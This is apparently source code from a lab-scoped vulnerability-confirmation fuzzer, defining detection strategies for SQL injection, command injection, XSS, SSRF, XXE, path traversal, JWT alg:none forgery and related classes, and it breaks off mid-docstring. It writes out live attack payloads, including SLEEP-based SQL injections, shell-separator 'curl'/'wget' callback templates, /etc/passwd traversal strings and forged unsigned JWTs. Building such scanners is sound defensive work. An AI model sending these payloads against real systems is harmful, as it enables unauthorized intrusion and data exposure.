"""Per-class confirmation strategies (Phase 2 T2.1).

Each strategy declares its `vuln_class` and the `mechanism` it uses, and confirms a
candidate deterministically or returns None (fail-closed — never a guess). New
classes are added as new strategies (and, later, plugin `register_oracle` hooks).
"""

from __future__ import annotations

import re
import secrets

from fuzzlab.oracle.baseline import build_baseline
from fuzzlab.oracle.browser import (
    SENTINEL,
    BrowserExecutor,
    ExecObservation,
    ExecRequest,
    StoreStep,
)
from fuzzlab.greybox.confirm import greybox_confirms, m10_evidence
from fuzzlab.greybox.coverage import CoverageSource, app_lines
from fuzzlab.greybox.dbfault import DbFaultSource
from fuzzlab.greybox.reward import GreyboxSignal
from fuzzlab.oracle.context import breakout_for, is_unescaped, type_reflection
from fuzzlab.oracle.oob import OobListener
from fuzzlab.oracle.probe import Candidate, Sender, Verdict

# --- error signatures (M2) ---------------------------------------------------
SQL_ERROR_SIGNATURES = [
    (re.compile(r"you have an error in your sql syntax", re.I), "MySQL"),
    (re.compile(r"warning:\s*mysqli?_", re.I), "MySQL"),
    (re.compile(r"sql syntax.*mariadb", re.I), "MariaDB"),
    (re.compile(r"unclosed quotation mark after the character string", re.I), "MSSQL"),
    (re.compile(r"quoted string not properly terminated", re.I), "Oracle"),
    (re.compile(r"pg_query\(\)|postgresql.*error|syntax error at or near", re.I), "PostgreSQL"),
    (re.compile(r"sqlite_error|sqlite3?::|unrecognized token", re.I), "SQLite"),
]

# --- timing templates (M1); {d} = requested delay in seconds ------------------
_TIMING_TEMPLATES = [
    "1 AND (SELECT 1 FROM (SELECT(SLEEP({d})))x)",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP({d})))x)-- -",
    "1) AND (SELECT 1 FROM (SELECT(SLEEP({d})))x)-- -",
    "1' OR SLEEP({d})-- -",
]

# --- ReDoS timing payloads (M1, escalating-shape variant) ------------------
# Classic, independent (never nested/deepened) catastrophic-backtracking
# shapes, one per common "run of a repeated character class" a target's own
# content might contain. See RegexDosStrategy's own docstring for why this
# is a genuinely different M1 variant from _TIMING_TEMPLATES/
# _CMDI_TIMING_TEMPLATES's requested-delay shape.
_REDOS_TEMPLATES = [
    r"(a+)+$",
    r"(a|a)*$",
    r"(a|aa)+$",
    r"([a-zA-Z]+)*$",
    r"(\d+)+$",
]

# Command-injection timing templates (shell separators; {d} = delay seconds).
_CMDI_TIMING_TEMPLATES = [
    "; sleep {d}",
    "| sleep {d}",
    "|| sleep {d}",
    "& sleep {d}",
    "&& sleep {d}",
    "$(sleep {d})",
    "`sleep {d}`",
    "1; sleep {d}",
]

# Command-injection OOB templates (M8; {url} = the loopback canary URL). Shell
# separators pair with tools any target OS's shell/base image is overwhelmingly
# likely to have (curl/wget), so this needs no DNS component.
_CMDI_OOB_TEMPLATES = [
    "; curl {url}",
    "| curl {url}",
    "|| curl {url}",
    "& curl {url}",
    "&& curl {url}",
    "$(curl {url})",
    "`curl {url}`",
    "; wget -q -O- {url}",
]

# Open-redirect body sinks (meta refresh) and /etc/passwd content marker (M7).
_META_REFRESH = re.compile(r"http-equiv=[\"']?refresh[\"']?[^>]*url=([^\"'>\s]+)", re.I)
_PASSWD_MARKER = re.compile(r"root:.*?:0:0:", re.M)
_TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../etc/passwd%00",
]


def _ssti_payloads(expr: str) -> list[str]:
    """Payloads that evaluate `expr` across common template engines."""
    return ["${" + expr + "}", "{{" + expr + "}}", "<%= " + expr + " %>",
            "#{" + expr + "}", "${{" + expr + "}}"]


def _token() -> str:
    return secrets.token_hex(4)


class ConfirmationStrategy:
    vuln_class: str = ""
    mechanism: str = ""
    category: str = ""

    @property
    def arm(self) -> str:
        """Stable scheduler arm id (unique even when a mechanism spans classes)."""
        return f"{self.vuln_class}:{self.mechanism}"

    def applies(self, candidate: Candidate) -> bool:
        # Prefer category scoping (a candidate's category can have several strategies,
        # e.g. reflected/stored/DOM XSS); fall back to vuln_class for direct use.
        if candidate.category is not None:
            return candidate.category == self.category
        return candidate.vuln_class in (None, self.vuln_class)

    def confirm(self, candidate: Candidate, sender: Sender) -> Verdict | None:  # pragma: no cover
        raise NotImplementedError

    @staticmethod
    def _send(sender: Sender, candidate: Candidate, value: str,
              timing: bool = False):
        """Send a probe for the candidate, honoring its method/location.

        Backward-compatible: a plain GET/query candidate uses the old
        ``send(url, param, value, timing=)`` signature (so existing senders and test
        fakes are unaffected); only a POST/body (or other non-default) candidate
        passes ``method``/``location`` through.
        """
        if candidate.method == "GET" and candidate.location == "query":
            return sender.send(candidate.url, candidate.param, value, timing=timing)
        if candidate.content_type:
            return sender.send(candidate.url, candidate.param, value, timing=timing,
                               method=candidate.method, location=candidate.location,
                               content_type=candidate.content_type)
        return sender.send(candidate.url, candidate.param, value, timing=timing,
                           method=candidate.method, location=candidate.location)

    # --- shared rising-delay timing confirmation (M1) ------------------------
    delays = (2, 4)
    baseline_samples = 3
    k = 3.0
    floor = 1.5           # seconds of added delay required above baseline
    tolerance = 0.6       # measured latency may fall this far short of the request

    def _confirm_timing(self, candidate: Candidate, sender: Sender,
                        templates: list[str]) -> Verdict | None:
        """Confirm a time-based injection: latency must rise with the requested delay.

        Shared by SQLi (SQL SLEEP) and command injection (shell sleep). Robust
        baseline (median/MAD), a floor above jitter, and a rising-delay check across
        two requested delays — never one slow response.
        """
        base = build_baseline([
            self._send(sender, candidate, "1", timing=True).elapsed
            for _ in range(self.baseline_samples)
        ])
        for template in templates:
            measured, ok = {}, True
            for d in self.delays:
                probe = self._send(sender, candidate, template.format(d=d), timing=True)
                measured[d] = probe.elapsed
                if not base.exceeds(probe.elapsed, k=self.k, floor=self.floor):
                    ok = False
                    break
                if probe.elapsed < d - self.tolerance:      # latency tracks the request
                    ok = False
                    break
            if ok and measured[self.delays[-1]] > measured[self.delays[0]]:
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"baseline_median": round(base.median, 4),
                                "measured": {str(k): round(v, 4) for k, v in measured.items()},
                                "template": template})
        return None


class SqliErrorStrategy(ConfirmationStrategy):
    vuln_class = "sqli"
    mechanism = "error-signature"
    category = "sql-injection"
    _probes = ("'", '"', "')", "1'")

    def confirm(self, candidate, sender):
        for payload in self._probes:
            probe = self._send(sender, candidate, payload)
            for rx, dbms in SQL_ERROR_SIGNATURES:
                match = rx.search(probe.text or "")
                if match:
                    return Verdict(True, self.vuln_class, self.mechanism,
                                   {"dbms": dbms, "payload": payload,
                                    "match": match.group(0)[:120]})
        return None


class SqliBooleanStrategy(ConfirmationStrategy):
    vuln_class = "sqli"
    mechanism = "boolean-differential"
    category = "sql-injection"

    @staticmethod
    def _similar(a: str, b: str, rel: float = 0.05, absolute: int = 24) -> bool:
        return abs(len(a) - len(b)) <= max(absolute, rel * max(len(a), len(b), 1))

    def confirm(self, candidate, sender):
        benign = self._send(sender, candidate, "1")
        true_p = self._send(sender, candidate, "1 AND 1=1")
        false_p = self._send(sender, candidate, "1 AND 1=2")
        # A true condition looks like the benign page; a false condition does not.
        if self._similar(benign.text, true_p.text) and not self._similar(true_p.text, false_p.text):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"len_benign": len(benign.text), "len_true": len(true_p.text),
                            "len_false": len(false_p.text)})
        return None


class SqliTimingStrategy(ConfirmationStrategy):
    vuln_class = "sqli"
    mechanism = "differential-timing"
    category = "sql-injection"

    def confirm(self, candidate, sender):
        return self._confirm_timing(candidate, sender, _TIMING_TEMPLATES)


class ReflectedXssStrategy(ConfirmationStrategy):
    vuln_class = "xss-reflected"
    mechanism = "reflected-context"
    category = "xss"

    def confirm(self, candidate, sender):
        token = _token()
        marker = f"zqxm{token}"
        first = self._send(sender, candidate, marker)
        context = candidate.sink_context or type_reflection(first.text, marker)
        if context == "none":
            return None
        breakout = breakout_for(context, f"zqxb{token}")
        if breakout is None:
            return None
        fragment, signature = breakout
        second = self._send(sender, candidate, fragment)
        if is_unescaped(second.text, signature):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"context": context, "signature": signature})
        return None


class OpenRedirectStrategy(ConfirmationStrategy):
    """M9: the parameter controls the redirect target (Location or meta refresh)."""
    vuln_class = "open-redirect"
    mechanism = "redirect-target-control"
    category = "open-redirect"

    @staticmethod
    def _header(probe, name):
        return next((v for k, v in probe.headers.items() if k.lower() == name), "")

    def confirm(self, candidate, sender):
        canary = f"https://oracle{_token()}.example/cb"
        probe = self._send(sender, candidate, canary)
        location = self._header(probe, "location")
        if location.startswith(canary):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"sink": "location-header", "location": location[:200]})
        m = _META_REFRESH.search(probe.text or "")
        if m and m.group(1).startswith(canary):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"sink": "meta-refresh", "url": m.group(1)[:200]})
        return None


class SstiStrategy(ConfirmationStrategy):
    """M4: a template expression is evaluated server-side (product appears, not the literal)."""
    vuln_class = "ssti"
    mechanism = "evaluation-marker"
    category = "server-side-template-injection"

    def confirm(self, candidate, sender):
        a, b = secrets.randbelow(900) + 100, secrets.randbelow(900) + 100
        expr, product = f"{a}*{b}", str(a * b)
        for payload in _ssti_payloads(expr):
            text = self._send(sender, candidate, payload).text or ""
            if product in text and expr not in text:      # evaluated, not just reflected
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"payload": payload, "product": product})
        return None


class PathTraversalStrategy(ConfirmationStrategy):
    """M7: a file-content marker (/etc/passwd) appears in the response."""
    vuln_class = "file-inclusion"
    mechanism = "file-content-marker"
    category = "file-inclusion"

    def confirm(self, candidate, sender):
        for payload in _TRAVERSAL_PAYLOADS:
            if _PASSWD_MARKER.search(self._send(sender, candidate, payload).text or ""):
                return Verdict(True, self.vuln_class, self.mechanism, {"payload": payload})
        return None


class CommandInjectionStrategy(ConfirmationStrategy):
    """M1 (timing): a shell `sleep` executes, latency rising with the requested delay."""
    vuln_class = "command-injection"
    mechanism = "differential-timing"
    category = "command-injection"

    def confirm(self, candidate, sender):
        return self._confirm_timing(candidate, sender, _CMDI_TIMING_TEMPLATES)


class RegexDosStrategy(ConfirmationStrategy):
    """M1 (differential timing), ReDoS variant: attacker-controlled regex-
    pattern construction causes catastrophic backtracking (CWE-1333),
    confirmed the same way SQLi/command-injection's timing use is --
    latency must rise far above a robust baseline -- but escalating a
    genuinely different axis, documented here rather than treated as a
    silent special case.

    **Why this is not `_confirm_timing` with a new template list.**
    `_TIMING_TEMPLATES`/`_CMDI_TIMING_TEMPLATES` each embed an explicit,
    attacker-*requested* delay (`SLEEP({d})`/`sleep {d}`) that a vulnerable
    target is expected to honor almost exactly, so `_confirm_timing` can
    assert both "well above baseline" AND "tracks the requested duration"
    (`probe.elapsed >= d - tolerance`) across two escalating delays. A ReDoS
    payload has no requested duration at all: how long a pathological
    pattern takes to fail (or succeed) matching is an emergent property of
    the regex engine's own backtracking over the TARGET's own content --
    content this strategy never sees and cannot control the shape of (only
    the pattern, sent as the probe value, is attacker-controlled here).
    There is therefore nothing to compare the measured latency *against*
    the way `_confirm_timing` compares it against `d`.

    **The escalation axis used instead.** Several independent, single-level
    (never nested/deepened) classic catastrophic-backtracking shapes
    (`_REDOS_TEMPLATES`), each targeting a different common "run of a
    repeated character class" (letters, digits, an alternation) a target's
    real content might contain. Nesting depth was tried and explicitly
    rejected during this mechanism's own calibration: deepening a single
    evil shape by even one level (`(a+)+$` -> `((a+)+)+$`) compounds the
    already-exponential blowup so violently that it hung well past any
    CI-safe bound on ordinary lab content -- see
    ``docs/architecture/oracle-confirmation.md``'s M1 ReDoS section for the
    calibration numbers. Confirmation requires **at least two** independent
    templates to each measure latency far above baseline
    (``floor``/``k``, overridden below to fit this mechanism's
    deliberately bounded, tens-to-low-hundreds-of-milliseconds probe
    magnitude, never the multi-second scale ``_confirm_timing``'s own
    ``floor=1.5`` assumes) -- the ReDoS analogue of "two escalating
    delays," substituting "two independent evil shapes" for "two requested
    durations" since no requested duration exists here.

    **Stated limitation, not silently equated with the SQLi/cmdi uses.**
    This can only detect ReDoS when the target's own content already
    contains a run of the character class a template targets -- a
    black-box confirmer has no way to know that shape in advance. Multiple
    templates targeting different common runs raise the odds without
    needing that knowledge, but coverage is inherently probabilistic here,
    unlike every other M1 use in this module (which can always supply their
    own exact requested delay). This mechanism was proven end to end
    against this project's own `node_express` ReDoS lab cells
    (`tests/test_labgen_redos.py`, real Node subprocess execution, not
    simulated timing), not yet against an arbitrary external target.
    """

    vuln_class = "redos"
    mechanism = "differential-timing"
    category = "regular-expression"

    # Overridden from the base class's SQLi/cmdi-tuned defaults: this
    # mechanism's probes are deliberately bounded to tens/low-hundreds of
    # milliseconds (never multi-second), so floor/k must be small enough to
    # actually fire at that scale while still clearing ordinary request
    # jitter (observed at low-single-digit milliseconds in this project's
    # own calibration, see the class docstring above).
    baseline_samples = 3
    k = 4.0
    floor = 0.02            # seconds (20ms) above baseline required
    min_confirming_templates = 2
    benign_probe = "ordinary-search-term"

    def confirm(self, candidate, sender):
        base = build_baseline([
            self._send(sender, candidate, self.benign_probe, timing=True).elapsed
            for _ in range(self.baseline_samples)
        ])
        confirming = []
        for template in _REDOS_TEMPLATES:
            probe = self._send(sender, candidate, template, timing=True)
            if base.exceeds(probe.elapsed, k=self.k, floor=self.floor):
                confirming.append({"template": template, "elapsed": round(probe.elapsed, 4)})
                if len(confirming) >= self.min_confirming_templates:
                    return Verdict(True, self.vuln_class, self.mechanism,
                                   {"baseline_median": round(base.median, 4),
                                    "confirming_templates": confirming})
        return None


class CommandInjectionOobStrategy(ConfirmationStrategy):
    """M8: blind command injection confirmed by an out-of-band callback.

    For the blind case where no timing skew or response difference is
    observable (output suppressed, egress delayed): embed a unique loopback
    canary URL in a shell-fetch payload and confirm only if that exact token
    is later requested. Needs an injected, already-started `OobListener`
    (lab loopback only, default-off, same seam shape as the M6
    `BrowserExecutor`); without one this strategy no-ops (fail-closed), never
    reaching for a real network listener on its own.
    """
    vuln_class = "command-injection"
    mechanism = "oob-callback"
    category = "command-injection"

    def __init__(self, listener: OobListener | None = None, timeout: float = 1.5):
        self._listener = listener
        self._timeout = timeout

    def confirm(self, candidate, sender):
        if self._listener is None:
            return None
        for template in _CMDI_OOB_TEMPLATES:
            token = self._listener.register()
            canary = self._listener.callback_url(token)
            self._send(sender, candidate, template.format(url=canary))
            hit = self._listener.wait_for(token, timeout=self._timeout)
            if hit is not None:
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"canary": canary, "template": template,
                                "hit_path": hit.path, "remote_addr": hit.remote_addr})
        return None


class SsrfInBandMarkerStrategy(ConfirmationStrategy):
    """The cheap first layer for SSRF: a single request, no OOB wait needed.

    Points the candidate directly at the `OobListener`'s own callback URL
    (reused as a marker responder here, not for its hit-recording side) and
    checks whether the *immediate* response to that one request echoes the
    minted token back -- exactly what this project's own SSRF lab cells do
    (`go_net_http`'s `unchecked_url_fetch` sink: `io.Copy(w, resp.Body)`).
    Cheaper than `SsrfOobStrategy` (no polling wait), so it runs first in
    `default_strategies()`, mirroring every other category's own
    cheapest-first stacking (SQLi: error/boolean/timing; command injection:
    timing then OOB). Needs the same injected, already-started
    `OobListener` `SsrfOobStrategy` does; without one, no-ops (fail-closed).
    """
    vuln_class = "ssrf"
    mechanism = "in-band-fetch-marker"
    category = "ssrf"

    def __init__(self, listener: OobListener | None = None):
        self._listener = listener

    def confirm(self, candidate, sender):
        if self._listener is None:
            return None
        token = self._listener.register()
        canary = self._listener.callback_url(token)
        probe = self._send(sender, candidate, canary)
        if token in (probe.text or ""):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"canary": canary, "marker": token})
        return None


class SsrfOobStrategy(ConfirmationStrategy):
    """The fallback layer for SSRF, when the target does not echo the
    fetched resource's body back (so `SsrfInBandMarkerStrategy` sees
    nothing): the same out-of-band callback the target's own request for
    that URL leaves in the loopback listener, per `CommandInjectionOobStrategy`'s
    established M8 pattern. Simpler than that sibling: the injected value
    *is* the callback URL sent directly -- an SSRF sink's own HTTP client
    fetches whatever URL it is given, unlike command injection, which needs
    a shell one-liner to turn a URL into an outbound fetch. A longer default
    timeout than `CommandInjectionOobStrategy`'s 1.5s: a local shell `curl`
    is near-instant, but an SSRF sink's own HTTP client call (DNS resolution,
    connect, a full response round trip) can plausibly take longer even when
    genuinely vulnerable. Needs an injected, already-started `OobListener`;
    without one, no-ops (fail-closed), never reaching for a real network
    listener on its own.
    """
    vuln_class = "ssrf"
    mechanism = "oob-fetch-callback"
    category = "ssrf"

    def __init__(self, listener: OobListener | None = None, timeout: float = 3.0):
        self._listener = listener
        self._timeout = timeout

    def confirm(self, candidate, sender):
        if self._listener is None:
            return None
        token = self._listener.register()
        canary = self._listener.callback_url(token)
        self._send(sender, candidate, canary)
        hit = self._listener.wait_for(token, timeout=self._timeout)
        if hit is not None:
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"canary": canary, "hit_path": hit.path,
                            "remote_addr": hit.remote_addr})
        return None


class AccessControlIdorStrategy(ConfirmationStrategy):
    """Confirms broken object-level authorization (IDOR/BOLA, CWE-639/862) by a
    differential: does the target return distinct, successful, id-keyed data for
    two arbitrary, unrelated id values with nothing rejecting either?

    Sends two unrelated id values and requires, for *both* legs: HTTP 200; a
    non-empty body that echoes the requested id value back (proving the
    response is actually keyed by what was sent, not a canned page); no
    generic access-denial phrase in the body; and that the two bodies differ
    (proof of two distinct records, not one static page repeated). All four
    must hold, or this fails closed (returns None) -- a real ownership check
    almost always denies with a non-2xx status, or an id-mismatch response,
    for at least one of two unrelated values.

    Known limitation, not silently swept under the rug: this cannot
    authenticate as two different real identities (this project's lab targets
    have no full session/auth system to drive yet -- see `FR-LAB-118`'s own
    scoping note), so it only proves "arbitrary ids are accepted with no
    ownership check", the IDOR/BOLA shape this project's own lab cells model --
    not a genuine cross-tenant-access proof against a live multi-user app. It
    can also false-positive on a legitimate endpoint that echoes an arbitrary
    id back without that id gating access to anything sensitive (e.g. a
    public lookup keyed by id rather than a private one); `R-ACCESS-CONTROL`
    scopes the rule to GET/query id-shaped param names to bound that risk, not
    eliminate it. This is the project's first strategy for this class and is
    expected to need broader validation against a second, differently-shaped
    target before being trusted beyond this lab (tracked as an open note in
    `docs/components/07-fuzzing-harness-and-oracle/requirements.md`).
    """
    vuln_class = "access_control"
    mechanism = "identity-differential"
    category = "access-control"

    # \b-anchored per PA-0022 (avoid an accidental substring hit, e.g.
    # "unauthorized" inside "preauthorized"); a false collision here only
    # costs a false negative (fails closed), never a false positive.
    _DENIAL_MARKERS = re.compile(
        r"\bforbidden\b|\bunauthorized\b|\baccess denied\b|\bnot found\b|\bpermission denied\b",
        re.I,
    )
    _ID_A = "50172"
    _ID_B = "88190475"

    def confirm(self, candidate, sender):
        a = self._send(sender, candidate, self._ID_A)
        b = self._send(sender, candidate, self._ID_B)
        if a.status != 200 or b.status != 200:
            return None
        if not a.text or not b.text:
            return None
        if self._DENIAL_MARKERS.search(a.text) or self._DENIAL_MARKERS.search(b.text):
            return None
        if self._ID_A not in a.text or self._ID_B not in b.text:
            return None
        if a.text == b.text:
            return None
        return Verdict(True, self.vuln_class, self.mechanism,
                       {"probe_a": a.text[:120], "probe_b": b.text[:120]})


class InsecureDeserializationTypeConfusionStrategy(ConfirmationStrategy):
    """Confirms unrestricted polymorphic-type deserialization (CWE-502) by a
    two-probe differential over Jackson's `WRAPPER_ARRAY` type-id format
    (`["<class-name>", {...}]`), the same shape `activateDefaultTyping`
    produces by default: real behavior, empirically verified against this
    project's own vulnerable/secure twins before this strategy was written
    (`LABGEN-JV-0001`/`LABGEN-JV-0002`, `lab/manifests/
    insecure_deserialization_spring_boot_sample.yaml`).

    Probe A names a real, always-present JDK class (`java.util.HashMap`) --
    a vulnerable target with no subtype allowlist accepts and instantiates
    it (HTTP 200). Probe B names a freshly-minted, guaranteed-nonexistent
    class (a random per-run token, never reused, so the response can't be
    an unrelated canned page): a vulnerable target still *attempts* class
    resolution using the literal attacker string and rejects it with an
    error that echoes that exact string back (empirically observed:
    `Could not resolve type id '<name>' as a subtype ...`); a secure target
    that never configured polymorphic typing at all categorically rejects
    the array-wrapped format outright (its own error never mentions our
    class name, since it never got that far). Confirms only when: A is 200;
    B is not 200; and B's body contains the literal minted class name --
    proof the rejection was specifically about *resolving that class*, not
    generic "any array body fails" behavior a non-vulnerable endpoint would
    also show. A bare "the benign probe returned 200" is deliberately not
    enough on its own -- an endpoint that returns 200 for any body without
    validating it at all would false-positive on that alone; requiring B's
    class-resolution-specific rejection rules that out.

    Known limitation, not silently swept under the rug: deliberately never
    sends a real gadget-chain payload (`ProcessBuilder`, JNDI/template
    triggers, etc.) -- this project's own no-new-dual-use-infra posture
    (the same reasoning that shelved the URLDNS follow-on for this same
    vuln class). It proves the CWE-502 *mechanism* (an attacker-controlled
    type id reaches class resolution and instantiation), not a demonstrated
    RCE impact. False-positive class: a legitimate endpoint whose actual
    DTO genuinely is a two-element JSON array with a string in the first
    slot that happens to parse as *some* value, and whose own validation
    error text happens to echo that string back for an unrelated reason --
    judged unlikely enough to accept, the same evidentiary bar this
    project's other single-request differentials (`SsrfInBandMarkerStrategy`)
    already use.
    """
    vuln_class = "insecure_deserialization"
    mechanism = "polymorphic-type-confusion"
    category = "insecure-deserialization"

    _BENIGN_CLASS = "java.util.HashMap"

    def confirm(self, candidate, sender):
        if candidate.content_type != "application/json":
            return None    # only a declared-JSON whole-body point can carry this format
        real = self._send(sender, candidate, '["%s",{}]' % self._BENIGN_CLASS)
        if real.status != 200:
            return None
        bogus_class = "zqxdeser" + _token() + ".NoSuchClass"
        bogus = self._send(sender, candidate, '["%s",{}]' % bogus_class)
        if bogus.status == 200:
            return None     # the bogus class also "succeeded" -- no differential signal
        if bogus_class not in (bogus.text or ""):
            return None     # rejection isn't attributable to resolving our exact class name
        return Verdict(True, self.vuln_class, self.mechanism,
                       {"benign_class": self._BENIGN_CLASS, "bogus_class": bogus_class})


# XXE (M-XXE): entity-wrapped XML around a `SYSTEM` reference. Two shapes tried
# in-band before falling back to OOB -- a `<title>` child (this lab's own apps'
# real extracted field, `xml_external_entities_enabled.java.j2`'s
# `getElementsByTagName("title")`) and a root-element-direct-text form (a
# plausible different real-world target shape that doesn't happen to read a
# `<title>` tag specifically). Not an attempt to cover every possible XML
# shape a target might expect (`XxeOobStrategy`'s fetch-only proof is the
# fallback for any shape neither wrapper happens to satisfy), the same
# "two independent, documented variants, then a fallback" shape
# `RegexDosStrategy`'s own `_REDOS_TEMPLATES` and `SsrfInBandMarkerStrategy`/
# `SsrfOobStrategy`'s own pairing both already use.
#
# **Safety scope, stated explicitly (never silently widen this):** the entity
# value sent here is *always* `OobListener`'s own loopback callback URL --
# never a real filesystem URI (`file:///etc/passwd`) or any other host. XXE's
# `SYSTEM` mechanism is trivially adaptable to a genuine local-file-read
# primitive, unlike SSRF's URL-only shape (which this pattern is otherwise
# modeled on) -- this strategy must never be extended to send anything other
# than the injected `OobListener`'s own minted canary URL without a fresh,
# dedicated safety review (`CLAUDE.md`'s lab-only/loopback-only posture).
_XXE_ENTITY_WRAPPERS = [
    "<r><title>&xxe;</title></r>",
    "<r>&xxe;</r>",
]


def _xxe_payload(entity_url: str, wrapper: str) -> str:
    return ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "%s">]>%s'
            % (entity_url, wrapper))


class XxeInBandMarkerStrategy(ConfirmationStrategy):
    """The cheap first layer for XXE: a single request per wrapper shape, no
    OOB wait needed. Mirrors `SsrfInBandMarkerStrategy` exactly, for XML
    instead of a raw URL param: points a `SYSTEM` external entity at the
    injected `OobListener`'s own callback URL (reused as a marker responder,
    same as the SSRF use) and checks whether the *immediate* response echoes
    the minted token back -- proven for real against this project's own XXE
    lab cells (`xml_external_entities_enabled.java.j2`'s
    `getElementsByTagName("title")` echo). Needs the same injected,
    already-started `OobListener` `SsrfInBandMarkerStrategy` does; without
    one, no-ops (fail-closed).

    Calls `sender.send()` directly rather than the shared `_send()` helper:
    this strategy's payload is always raw XML at its own fixed content type
    (`application/xml`), independent of whatever `candidate.content_type`
    the ground truth declared for the point's own ordinary traffic shape
    (XXE's own ground truth is `rendering="server"`, not `server-json`, so
    `candidate.content_type` is `None` -- `_send()` would form-encode the
    whole XML payload as one field value instead of sending it as a raw
    body, defeating the entity-parsing proof entirely).
    """
    vuln_class = "xxe"
    mechanism = "in-band-external-entity-marker"
    category = "xxe"

    def __init__(self, listener: OobListener | None = None):
        self._listener = listener

    def confirm(self, candidate, sender):
        if self._listener is None:
            return None
        token = self._listener.register()
        canary = self._listener.callback_url(token)
        for wrapper in _XXE_ENTITY_WRAPPERS:
            probe = sender.send(candidate.url, candidate.param,
                                _xxe_payload(canary, wrapper),
                                method=candidate.method, location=candidate.location,
                                content_type="application/xml")
            if token in (probe.text or ""):
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"canary": canary, "marker": token, "wrapper": wrapper})
        return None


class XxeOobStrategy(ConfirmationStrategy):
    """The fallback layer for XXE, when the target does not echo the
    resolved entity's content back into a visible response (blind XXE) --
    the fetch itself, observed via the same out-of-band callback the
    target's own parser leaves in the loopback listener, mirrors
    `SsrfOobStrategy`'s established pattern exactly. Needs an injected,
    already-started `OobListener`; without one, no-ops (fail-closed).
    """
    vuln_class = "xxe"
    mechanism = "oob-external-entity-fetch"
    category = "xxe"

    def __init__(self, listener: OobListener | None = None, timeout: float = 3.0):
        self._listener = listener
        self._timeout = timeout

    def confirm(self, candidate, sender):
        if self._listener is None:
            return None
        token = self._listener.register()
        canary = self._listener.callback_url(token)
        sender.send(candidate.url, candidate.param,
                    _xxe_payload(canary, _XXE_ENTITY_WRAPPERS[0]),
                    method=candidate.method, location=candidate.location,
                    content_type="application/xml")
        hit = self._listener.wait_for(token, timeout=self._timeout)
        if hit is not None:
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"canary": canary, "hit_path": hit.path})
        return None


def _jwt_b64url(obj: dict) -> str:
    import base64
    import json
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()


class JwtAlgNoneConfusionStrategy(ConfirmationStrategy):
    """Confirms JWT `alg:none` signature-verification confusion (CWE-347,
    the real `auth0/node-jsonwebtoken` GHSA-8cf7-32gw-wr33 bug this
    project's own `CC-LAB-0180` cell models) by a two-probe differential
    over a header-carried Bearer token, mirroring
    `InsecureDeserializationTypeConfusionStrategy`'s own two-probe shape
    (a bare "does it return 200" check is not enough evidence on its
    own -- see that strategy's own docstring for the same reasoning).

    Probe A: an unsigned token whose header claims `alg:none`, carrying a
    freshly-minted per-run marker in its `channel_id` claim (the literal
    field this project's own `CC-LAB-0180` sink echoes back --
    `jwt_claims_response.go.j2` unmarshals only `channel_id`/`role`, so
    the marker must travel in one of those two fields, not an arbitrary
    one, to actually appear in the response). Confirms only if this
    returns HTTP 200 with that exact marker echoed back -- proof the
    target trusted the unsigned token's own forged claims.

    Probe B (the differentiator): the *same* marker, but claiming
    `alg:HS256` with a garbage signature. Must return a real auth-
    rejection status (401 or 403 -- not merely "not 200", which would
    also match an unrelated parsing crash on malformed input and falsely
    look like a rejection) for this to count as evidence the target
    specifically honors `alg:none` rather than being broadly permissive
    or broadly broken on any malformed token.

    Known limitation, not silently swept under the rug: this assumes the
    candidate's header actually carries a JWT. Against a target whose
    `Authorization` header is Basic auth, an opaque API key, or any
    other non-JWT scheme, probe A's base64url/JSON-decode-then-look-for-
    a-literal-marker check has nothing to match (the target's own
    handler never produces the marker string in its response for an
    unrelated auth scheme), so this strategy fails closed (returns
    `None`) rather than misfiring -- it does not, and cannot, positively
    confirm the *absence* of this vulnerability class for a non-JWT
    target, only decline to guess.
    """
    vuln_class = "jwt_algorithm_confusion"
    mechanism = "alg-none-bypass"
    category = "jwt-algorithm-confusion"

    def confirm(self, candidate, sender):
        token = _token()
        alg_none_jwt = (
            _jwt_b64url({"alg": "none", "typ": "JWT"}) + "."
            + _jwt_b64url({"channel_id": token, "role": "owner"}) + "."
        )
        probe_a = self._send(sender, candidate, f"Bearer {alg_none_jwt}")
        if probe_a.status != 200 or token not in (probe_a.text or ""):
            return None
        garbage_hs256_jwt = (
            _jwt_b64url({"alg": "HS256", "typ": "JWT"}) + "."
            + _jwt_b64url({"channel_id": token, "role": "owner"}) + "."
            + "garbage-not-a-real-signature"
        )
        probe_b = self._send(sender, candidate, f"Bearer {garbage_hs256_jwt}")
        if probe_b.status not in (401, 403):
            return None
        return Verdict(True, self.vuln_class, self.mechanism, {"marker": token})


def _session_token(text: str | None) -> str | None:
    import json
    try:
        return json.loads(text or "")["session_token"]
    except (ValueError, TypeError, KeyError):
        return None


class PredictableTokenSourceStrategy(ConfirmationStrategy):
    """Confirms a predictable, timestamp-derived session token (CWE-330,
    this project's own `CC-LAB-0181` cell) with a two-probe differential:
    send two ordinary probes, parse each response's own `session_token`
    field, and confirm only if both parse as base-10 integers whose
    difference is a small, non-negative number of nanoseconds.

    **The primary false-positive defense is the parse gate, not the delta
    bound**: a real `crypto/rand`-sourced hex token (this project's own
    secure twin renders 64 lowercase hex characters) essentially never
    parses as an all-decimal integer -- the probability every one of 64
    independent hex digits happens to land in `{0-9}` rather than
    `{a-f}` is `(10/16)**64 ~= 8.6e-14`, vanishingly small. The delta
    bound (`_DELTA_CEILING_NS`) is a fixed, generous backstop
    (10 seconds in nanoseconds -- several orders of magnitude above the
    ~1ms deltas this project's own real live-boot test observes between
    two ordinary sequential probes), not a precise measurement of actual
    elapsed wall-clock time: a fixed ceiling is immune to test-
    infrastructure jitter (a loaded CI runner, network latency to a real
    target) in a way that trying to bound the delta to a *measured*
    elapsed-time window would not be.

